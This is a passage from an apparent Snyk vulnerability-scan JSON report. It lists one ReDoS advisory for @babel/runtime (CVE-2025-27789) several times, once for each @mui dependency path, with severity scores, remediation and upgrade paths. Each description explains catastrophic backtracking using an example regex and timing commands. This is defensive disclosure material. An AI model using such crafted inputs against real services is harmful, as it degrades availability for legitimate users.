        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "@mui/private-theming@5.13.1",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "@mui/private-theming@5.17.1",
          "@mui/utils@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@mui/private-theming@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@mui/system@5.13.2",
          "@mui/styled-engine@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
